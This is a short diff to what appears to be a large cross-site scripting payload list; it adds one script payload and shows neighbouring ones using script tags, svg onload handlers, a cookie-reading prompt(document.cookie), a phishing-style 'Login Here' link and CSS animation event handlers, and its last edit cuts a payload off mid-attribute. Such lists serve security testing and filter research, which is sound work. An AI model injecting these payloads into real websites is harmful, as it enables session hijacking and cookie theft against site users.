@@ -2,6 +2,7 @@
 "><A HREF="https://www.cia.gov/">Login Here </A>
 "><script>prompt(document.cookie)</script>
 "><svg/onload=prompt('Supakiad-S. (m3ez)', document.domain)​>
+<script>onerror=alert;throw `Supakiad S. m3ez`;</script>
 
 <script>alert(1)</script>
 <scr ipt>alert(1)</scr ipt>
@@ -13923,4 +13924,4 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <style>@keyframes slidein {}</style><input style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></input>
 <style>@keyframes slidein {}</style><input style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></input>
 <style>@keyframes slidein {}</style><input2 style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></input2>
-<style>@keyframes slidein {}</style><input2 style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration
+<style>@keyframes slidein {}</style><input2 style="animation-duration:1s;animation-name
